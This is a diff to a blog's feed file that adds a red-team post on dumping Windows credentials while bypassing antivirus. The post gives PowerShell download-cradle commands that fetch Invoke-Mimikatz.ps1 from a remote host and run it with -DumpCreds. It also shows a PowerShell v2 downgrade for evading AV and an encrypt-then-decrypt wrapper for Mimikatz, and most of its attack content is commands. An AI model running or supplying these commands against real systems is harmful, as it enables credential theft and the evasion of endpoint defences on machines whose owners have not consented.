@@ -4,6 +4,37 @@
   
     
     <entry>
+      <title>Powershell bypass catch password</title>
+      <link href="2021/07/31/powershell-bypass-catch-password/"/>
+      <url>2021/07/31/powershell-bypass-catch-password/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-none"><code class="language-none">From a practical point of view, solve the practical problems encountered, simple record, can bypass 360 and HuoRong<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">According to PowerShell&#39;s default policy, ps1 scripts are not allowed to executeGet-executionpolicy indicates that the current policy is Restricted<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20catch%20password/1.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">You can change the execution policy with the administrator permission<span class="token punctuation">.</span> <span class="token keyword">Do</span> not ask me why I have the administrator permission<span class="token punctuation">.</span> You can not <span class="token keyword">catch</span> passwords with the normal user<span class="token function">Set-ExecutionPolicy</span> Unrestricted<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20catch%20password/2.png"></p><h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><h3 id="PSV2"><a href="#PSV2" class="headerlink" title="PSV2"></a>PSV2</h3><pre class="line-numbers language-none"><code class="language-none">as we all known the easy way like thispowershell -exec bypass -C &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.159.1:8888&#x2F;Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz -DumpCreds&quot;now you can use the v2 maybe can bypass some av like thispowershell -Version 2 -exec bypass -C &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.159.1:8888&#x2F;Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz -DumpCreds&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20catch%20password/3.png"></p><h3 id="Encode-script"><a href="#Encode-script" class="headerlink" title="Encode script"></a>Encode script</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">as we all know the Powersploit project<span class="token punctuation">,</span> how about use this project to bypass?Here we use the <span class="token function">out-encryptedScript</span> to place the script in the same directory as the MimiKatz script<span class="token punctuation">,</span> and then encrypt it in turn<span class="token function">Import-Module</span> <span class="token punctuation">.</span>\<span class="token function">Out-EncryptedScript</span><span class="token punctuation">.</span>ps1<span class="token function">Out-EncryptedScript</span> <span class="token operator">-</span>ScriptPath <span class="token punctuation">.</span>\<span class="token function">Invoke-Mimikatz</span><span class="token punctuation">.</span>ps1 <span class="token operator">-</span>Password woshijiamide <span class="token operator">-</span>Salt safety<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20catch%20password/4.png">```</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">let our ps1script up to our tar then like thispowershell<span class="token punctuation">.</span>exe<span class="token function">IEX</span><span class="token punctuation">(</span><span class="token function">New-Object</span> Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadString<span class="token punctuation">(</span><span class="token string">"http://192.168.159.1:8888/Out-EncryptedScript.ps1"</span><span class="token punctuation">)</span> <span class="token namespace">[String]</span> <span class="token variable">$cmd</span> = <span class="token function">Get-Content</span> <span class="token punctuation">.</span>\new1<span class="token punctuation">.</span>ps1<span class="token function">Invoke-Expression</span> <span class="token variable">$cmd</span><span class="token variable">$decrypted</span> = de woshijiamide safety<span class="token function">Invoke-Expression</span> <span class="token variable">$decrypted</span><span class="token function">Invoke-Mimikatz</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20catch%20password/5.png"></p><pre class="line-numbers language-none"><code class="language-none">the same way, Of course, both files are put remote, also does not affect the final effectmaybe will get some wrong, but we also can catch PW<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20catch%20password/6.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Learning record </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Redteam </tag>
+            
+            <tag> Bypass </tag>
+            
+            <tag> Mimikatz </tag>
+            
+            <tag> Catch Password </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Exchange Export email methods</title>
       <link href="2021/07/30/exchange-export-email-methods/"/>
       <url>2021/07/30/exchange-export-email-methods/</url>
